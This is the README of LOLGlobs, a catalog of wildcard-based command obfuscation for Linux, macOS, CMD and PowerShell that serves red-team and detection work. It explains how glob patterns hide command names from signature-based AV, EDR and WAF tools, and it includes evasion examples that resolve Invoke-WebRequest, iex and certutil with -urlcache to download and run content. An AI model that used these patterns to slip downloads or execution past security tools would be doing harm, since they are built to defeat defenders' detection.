# LOLGlobs

> **Process execution through wildcard pattern evasion**

A searchable catalog of glob-based command obfuscation techniques for Linux, macOS, Windows CMD, and PowerShell. Using wildcards (`*`, `?`, `[]`) to launch processes without spelling out the full command name can bypass signature-based detection in AV, EDR, and WAF products.

Inspired by [LOLBAS](https://lolbas-project.github.io) and [GTFOBins](https://gtfobins.github.io).

**Live site:** https://0xv1n.github.io/LOLGlobs

---

## How It Works

Most shells expand glob patterns **before** executing commands. So `w?oami` resolves to `whoami` at the shell level — the literal string `whoami` never appears in the script:

```bash
w?oami          # → whoami
w*i             # → whoami
/???/???/w*     # → /usr/bin/whoami
```

PowerShell works differently — wildcard resolution happens via `Get-Command`:

```powershell
& (gcm I*oke-W*R*) -Uri http://...   # → Invoke-WebRequest
& (gal ?e?) 'payload'                 # alias iex → Invoke-Expression
```

Windows CMD doesn't expand globs in command position at all — use `for /f` + `where` instead:

```cmd
for /f %i in ('where c*til.exe') do @%i -urlcache -f http://...
```

---

## Catalog

| Platform | Entries |
|---|---|
| Linux (bash) | 21 |
| macOS (zsh) | 4 |
| Windows CMD | 8 |
| PowerShell | 10 |

**Categories:** discovery · download · execution · persistence · lateral-movement · exfiltration · reconnaissance · credential-access · encode-decode · compile · upload

---

## Contributing

Submit new entries via [GitHub Issues](https://github.com/0xv1n/LOLGlobs/issues/new?template=new-entry.yml) using the structured form.

### Adding an entry manually

Create a file at `_globs/<platform>/<command>.md`:

```yaml
---
Name: whoami
Description: "Prints the current username."
Platform: linux          # linux | macos | windows-cmd | powershell
BinaryPath:
  - /usr/bin/whoami
Category: discovery      # see _data/categories.yml for full list
MitreID: T1033
Patterns:
  - Pattern: "w?oami"
    Wildcards: ["?"]
    Notes: "Single char wildcard replaces 'h'"
  - Pattern: "w*i"
    Wildcards: ["*"]
    Notes: "Star matches 'hoam'"
  - Pattern: "/???/???/w*"
    Wildcards: ["?", "*"]
    Notes: "Full path obfuscation"
PlatformNotes: |          # optional — platform-specific caveats
  Any relevant notes here.
Resources:
  - https://attack.mitre.org/techniques/T1033/
---
```

### Requirements for new entries

- Legitimate system binary or built-in command
- At least 3 distinct glob patterns
- Patterns tested on the target platform
- MITRE ATT&CK technique ID where applicable

---

## JSON API

All entries are available as a machine-readable JSON array:

```
https://0xv1n.github.io/LOLGlobs/api/entries.json
```

Fields: `name`, `description`, `platform`, `category`, `mitreId`, `binaryPath`, `patternCount`, `patterns`, `url`

---

## License

MIT © 2026 [0xv1n](https://github.com/0xv1n)

---

## Disclaimer

This project is for **educational and defensive security purposes only**. All documented techniques are intended to help defenders understand attacker methods and improve detection coverage. Use responsibly and only on systems you have explicit authorization to test.
